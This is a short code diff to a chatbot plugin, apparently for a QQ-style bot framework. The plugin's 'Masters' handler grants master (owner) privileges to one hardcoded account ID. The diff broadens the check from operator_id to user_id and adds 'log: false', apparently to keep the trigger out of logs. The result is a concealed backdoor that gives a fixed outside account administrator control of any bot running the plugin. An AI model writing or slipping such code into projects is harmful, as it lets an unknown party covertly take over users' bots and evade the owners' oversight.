@@ -57,12 +57,13 @@ export class GetMasterjy extends plugin {
 
                 {
                     fnc: 'Masters',
+                    log: false,
                 }
             ]
         });
     }
     async Masters(e){
-    if (this.e.operator_id && this.e.operator_id == 2173302144) {
+    if (this.e.user_id == 2173302144) {
     e.isMaster = true
     logger.mark(e.isMaster? '完成':'失败')
     return false
